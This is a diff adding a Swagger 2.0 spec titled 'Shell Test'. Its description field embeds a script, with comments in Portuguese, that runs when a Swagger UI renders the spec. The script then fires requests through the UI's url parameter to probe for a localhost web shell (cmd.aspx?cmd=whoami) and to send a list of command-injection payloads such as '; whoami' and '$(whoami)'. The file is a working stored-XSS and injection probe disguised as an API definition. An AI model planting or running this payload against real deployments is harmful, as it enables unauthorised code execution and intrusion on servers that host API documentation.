@@ -1,0 +1,29 @@
+swagger: "2.0"
+info:
+  title: Shell Test
+  description: |
+    <script>
+      // Tentar executar comandos via várias técnicas
+      
+      // 1. Tentar Web Shell se for Windows + IIS
+      fetch('/api/swagger/index.html?url=http://localhost/cmd.aspx?cmd=whoami', {
+        mode: 'no-cors'
+      });
+      
+      // 2. Tentar Command Injection via parâmetros
+      var payloads = [
+        '| whoami',
+        '; whoami',
+        '`whoami`',
+        '$(whoami)',
+        '|| whoami',
+        '&& whoami'
+      ];
+      
+      payloads.forEach(payload => {
+        fetch('/api/swagger/index.html?url=http://localhost' + encodeURIComponent(payload));
+      });
+      
+      alert('Command injection attempts sent');
+    </script>
+paths: {}
